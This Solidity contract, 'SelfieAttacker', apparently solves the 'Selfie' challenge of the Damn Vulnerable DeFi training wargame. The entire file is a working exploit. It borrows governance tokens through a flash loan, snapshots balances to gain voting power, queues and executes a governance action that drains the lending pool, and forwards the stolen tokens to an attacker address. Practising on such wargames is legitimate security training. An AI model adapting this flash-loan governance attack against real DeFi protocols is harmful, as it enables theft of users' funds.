pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20Snapshot.sol";

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttacker {
    using Address for address payable;

    SimpleGovernance private gov;
    DamnValuableTokenSnapshot private govToken;
    SelfiePool private selfiePool;
    uint256 private cachedId;

    constructor(address govAddr, address govTokenAddr, address selfieAddr) public {
        gov = SimpleGovernance(govAddr);
        govToken = DamnValuableTokenSnapshot(govTokenAddr);
        selfiePool = SelfiePool(selfieAddr);
        cachedId = 0;
    }

    function getLoan(uint256 amount) public {
        selfiePool.flashLoan(amount);
    }

    function queueDrain() public {
        cachedId = gov.queueAction(address(selfiePool), abi.encodeWithSignature("drainAllFunds(address)", address(this)), 0);
    }

    function executeDrain() public {
        gov.executeAction(cachedId);
    }

    function receiveTokens(address token, uint256 amount) public {
        if (cachedId == 0) {
            ERC20Snapshot snapToken = ERC20Snapshot(token);
            govToken.snapshot();
            snapToken.transfer(msg.sender, amount);
        } else {
            executeDrain();
        }
    }

    function sendTo(address attacker) public {
        ERC20Snapshot tok = selfiePool.token();
        tok.transfer(attacker, tok.balanceOf(address(this)));
    }
}